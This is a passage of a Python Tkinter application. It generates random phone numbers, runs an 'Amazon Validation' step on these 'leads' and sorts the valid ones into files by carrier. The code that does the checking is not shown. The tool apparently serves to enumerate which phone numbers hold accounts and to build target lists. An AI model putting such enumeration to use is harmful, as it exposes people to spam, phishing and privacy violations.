                self.generate_button.config(state="normal")
                return

            prefixes = []
            if prefixes_raw:
                prefixes = [p.strip() for p in re.split(r'[,\s]+', prefixes_raw) if p.isdigit()]

            self.update_gen_progress(0, num_count, "Connecting to server...")
            simulate_api_request(duration=1)
            generated_numbers = []
            for i in range(num_count):
                area = random.choice(area_codes)
                if prefixes:
                    prefix = random.choice(prefixes)
                else:
                    prefix = str(random.randint(100, 999))
                if country_code == "61":
                    local_length = random.choice([6, 8])
                    line_number = ''.join(random.choices('0123456789', k=local_length))
                    phone_number = f'+{country_code} ({area}) {prefix}{line_number}'
                else:
                    line_number = ''.join(random.choices('0123456789', k=4))
                    phone_number = f'+{country_code} ({area}) {prefix}-{line_number}'
                generated_numbers.append(phone_number)
                print(colored("Generated: " + phone_number, "green"))
                self.controller.after(0, self.update_gen_progress, i + 1, num_count)
                time.sleep(0.001)
            clear_file("Gen.txt")
            with open("Gen.txt", "w") as f:
                for num in generated_numbers:
                    f.write(num + "\n")
            self.controller.after(0, self.update_gen_progress, num_count, num_count,
                                  f"Done: {num_count} numbers generated and saved.")
            self.controller.after(0, lambda: self.continue_button.config(state="normal"))
        except Exception as e:
            messagebox.showerror("Error", str(e), parent=self)
            self.generate_button.config(state="normal")

    def go_to_validation(self):
        self.controller.show_frame("ValidationPage")


# ----------------- Page 2: Amazon Validation -----------------
class ValidationPage(AnimatedFrame):
    def __init__(self, parent, controller):
        AnimatedFrame.__init__(self, parent)
        self.controller = controller

        header = ttk.Label(self, text="Amazon Validation", style="Header.TLabel")
        header.pack(fill="x", pady=(0, 10))

        self.val_progress = ttk.Progressbar(self, orient="horizontal", mode="determinate")
        self.val_progress.pack(pady=10, padx=20, fill="x")
        self.val_label = ttk.Label(self, text="Validating leads... 0%")
        self.val_label.pack()
        self.continue_button = ttk.Button(self, text="Continue to Carrier Lookup",
                                          command=self.go_to_carrier, state="disabled")
        self.continue_button.pack(pady=10)

    def on_show(self):
        global completed_tasks, total_numbers
        completed_tasks = 0
        total_numbers = 0
        clear_file("Valid33.txt")
        self.validation_thread = threading.Thread(target=process_numbers, daemon=True)
        self.validation_thread.start()
        self.update_validation_progress()

    def update_validation_progress(self):
        global completed_tasks, total_numbers
        valid_count = 0
        if os.path.exists("Valid33.txt"):
            with open("Valid33.txt", "r") as f:
                valid_count = sum(1 for line in f if line.strip())
        percent = (completed_tasks / total_numbers * 100) if total_numbers else 0
        self.val_progress['maximum'] = total_numbers
        self.val_progress['value'] = completed_tasks
        self.val_label.config(text=f"Processed: {total_numbers}, Valid: {valid_count}, {percent:.0f}%")
        if self.validation_thread.is_alive():
            self.after(100, self.update_validation_progress)
        else:
            if os.path.exists("Valid33.txt"):
                with open("Valid33.txt", "r") as f:
                    valid_count = sum(1 for line in f if line.strip())
            self.val_label.config(text=f"Validation complete! Processed: {total_numbers}, Valid: {valid_count}")
            self.continue_button.config(state="normal")

    def go_to_carrier(self):
        self.controller.show_frame("CarrierLookupPage")


# ----------------- Page 3: Carrier Lookup -----------------
class CarrierLookupPage(AnimatedFrame):
    def __init__(self, parent, controller):
        AnimatedFrame.__init__(self, parent)
        self.controller = controller

        header = ttk.Label(self, text="Carrier Lookup", style="Header.TLabel")
        header.pack(fill="x", pady=(0, 10))

        self.carrier_progress = ttk.Progressbar(self, orient="horizontal", mode="indeterminate")
        self.carrier_progress.pack(pady=10, padx=20, fill="x")
        self.carrier_label = ttk.Label(self, text="Looking up carriers...")
        self.carrier_label.pack()
        self.file_summary_label = ttk.Label(self, text="", justify="left")
        self.file_summary_label.pack(pady=10, padx=20)

    def safe_after(self, delay, callback):
        try:
            if self.controller.winfo_exists():
                self.controller.after(delay, callback)
        except tk.TclError:
            pass

    def on_show(self):
        # Clear the validated_numbers folder before lookup
        clear_directory("validated_numbers")
        self.start_carrier_lookup()

    def start_carrier_lookup(self):
        self.carrier_progress.start(10)
        self.carrier_thread = threading.Thread(target=self.run_carrier_lookup, daemon=True)
        self.carrier_thread.start()
        self.update_summary()

    def update_summary(self):
        folder = "validated_numbers"
        summary = ""
        valid_total = 0
        if os.path.exists(folder):
            for file in os.listdir(folder):
                if file.endswith(".txt"):
                    path = os.path.join(folder, file)
                    try:
                        count = sum(1 for line in open(path))
                    except Exception:
                        count = 0
                    summary += f"{file}: {count}\n"
                    valid_total += count
        else:
            summary = "No carrier files found."
        self.file_summary_label.config(text=f"Total Valid Numbers: {valid_total}\n{summary}")
        # Update live every 500 ms
        self.after(500, self.update_summary)

    def run_carrier_lookup(self):
        if not os.path.exists("Valid33.txt"):
            self.safe_after(0, lambda: messagebox.showerror("Error",
                                                             "Valid33.txt not found. Please run the validation process first.",
                                                             parent=self))
            self.safe_after(0, lambda: self.controller.show_frame("GeneratorPage"))
            return
        try:
            phone_validator = PhoneNumberValidator()
            phone_validator.run("Valid33.txt")
            try:
                with open("Valid33.txt", "r") as f:
                    lines = f.readlines()
                valid_total = len(lines)
            except Exception:
                valid_total = 0
            msg = f"{valid_total} numbers processed. Valid numbers saved in their respective carrier files."
            self.safe_after(0, lambda: self.carrier_progress.stop())
            self.safe_after(0, lambda: self.carrier_label.config(text="Carrier Lookup Complete!"))
            self.safe_after(0, lambda: messagebox.showinfo("Carrier Lookup", msg, parent=self))
        except Exception as e:
            error_message = str(e)
            self.safe_after(0, lambda: messagebox.showerror("Error", error_message, parent=self))


# =============================================================================
#                                Main
# =============================================================================
def main():
    freeze_support()  # Necessary for Windows multiprocessing support
    app = MainApp()
    app.mainloop()


if __name__ == "__main__":
    main()
